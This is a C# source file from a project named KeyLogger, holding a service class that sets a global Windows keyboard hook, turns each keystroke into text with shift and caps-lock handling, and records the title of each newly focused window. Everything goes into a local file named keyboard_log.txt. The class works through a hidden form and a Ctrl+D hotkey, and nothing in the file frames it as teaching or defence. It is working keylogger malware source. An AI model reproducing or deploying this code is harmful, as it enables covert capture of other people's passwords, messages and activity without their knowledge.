using KeyLogger.Enums;
using KeyLogger.Forms;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using static KeyLogger.WinApis.User32;
using static KeyLogger.WinApis.Kernel32;

namespace KeyLogger.Services
{
	internal class HandleUserInputsService
	{
		private static bool _capsLock;
		private static bool _shift;
		private static bool _numLock;
		private static bool _scrollLock;
		private const string _fileName = "keyboard_log.txt";
		private const short maxChars = 256;

		internal static IntPtr HookId { get; set; }
		internal static IntPtr WindowHookId { get; set; }

		private static HiddenForm _hiddenForm;

		internal HandleUserInputsService(HiddenForm hiddenForm)
		{
			_hiddenForm = hiddenForm;
			_hiddenForm.KeyId = HotKeysService.SetHotKey(Keys.D | Keys.Control, _hiddenForm.Handle);
			HookId = IntPtr.Zero;
			WindowHookId = IntPtr.Zero;
		}

		internal IntPtr SetHook(HookTypes typeOfHook, HookProc callBack)
		{
			using (Process currentProcess = Process.GetCurrentProcess())
			using (ProcessModule currentModule = currentProcess.MainModule)
			{			
				return SetWindowsHookEx((int)typeOfHook, callBack,
					 GetModuleHandle(currentModule.ModuleName), 0);
			}
		}

		internal IntPtr SetWinHook(WinEventProc callBack)
		{
			using (Process currentProcess = Process.GetCurrentProcess())
			using (ProcessModule currentModule = currentProcess.MainModule)
			{
				return SetWinEventHook(
					WinEventTypes.EVENT_SYSTEM_FOREGROUND, 
					WinEventTypes.EVENT_SYSTEM_FOREGROUND, 
					GetModuleHandle(currentModule.ModuleName), 
					callBack, 0, 0, WinEventTypes.WINEVENT_OUTOFCONTEXT);
			}
			
		}

		internal static IntPtr KeyLoggerHookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			if (nCode >= 0 && wParam == (IntPtr)KeyboardEventTypes.WM_KEYUP)
			{
				int vkCode = Marshal.ReadInt32(lParam);
				SetKeysState();
				var saveText = GetSymbol((uint)vkCode);
				File.AppendAllText(_fileName, saveText);
			}
			return CallNextHookEx(HookId, nCode, wParam, lParam);
		}

		internal static void ActiveWindowsHook(
			IntPtr hWinEventHook, uint eventType, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
		{
				File.AppendAllText(_fileName, $"{Environment.NewLine}{GetActiveWindowTitle()}{Environment.NewLine}");
		}

		private static string GetActiveWindowTitle()
		{
			var buff = new StringBuilder(maxChars);
			var handle = GetForegroundWindow();

			if (GetWindowText(handle, buff, maxChars) > 0)
			{
				return buff.ToString();
			}
			return null;
		}

		private static void SetKeysState()
		{
			_capsLock = GetKeyState((int)Keys.CapsLock) != 0;
			_numLock = GetKeyState((int)Keys.NumLock) != 0;
			_scrollLock = GetKeyState((int)Keys.Scroll) != 0;
			_shift = GetKeyState((int)Keys.ShiftKey) != 0;
		}

		private static string GetSymbol(uint vkCode)
		{
			var buff = new StringBuilder(maxChars);
			var keyboardState = new byte[maxChars];
			var keyboard = GetKeyboardLayout(
					  GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
			ToUnicodeEx(vkCode, 0, keyboardState, buff, maxChars, 0, (IntPtr)keyboard);
			var buffSymbol = buff.ToString();
			var symbol = buffSymbol.Equals("\r") 
				? Environment.NewLine 
				: buffSymbol;
			if (_capsLock ^ _shift)
				symbol = symbol.ToUpperInvariant();
			return symbol;
		}
	}
}
